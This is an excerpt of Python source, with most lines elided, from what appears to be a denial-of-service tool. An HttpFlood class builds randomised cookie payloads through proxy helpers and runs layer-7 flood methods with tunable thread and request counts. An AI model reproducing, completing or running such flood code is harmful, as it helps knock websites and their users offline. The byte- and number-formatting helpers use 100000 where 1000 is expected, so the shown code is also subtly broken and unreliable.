...
class Tools:
    ...
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        ...
        if i > 0:
            base = 1024 if binary else 100000
    ...
    def humanformat(num: int, precision: int = 2):
        ...
        if num > 999:
            obje = sum(
                [abs(num / 100000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 100000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num
...
class HttpFlood(Thread):
    ...
    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            ...
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(100000, 999999), ProxyTools.Random.rand_str(6),
    ...
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if threads > 100000:
                    logger.warning("Thread is higher than 100000")
                if rpc > 100000:
                    logger.warning(
                        "RPC (Request Pre Connection) is higher than 100000")
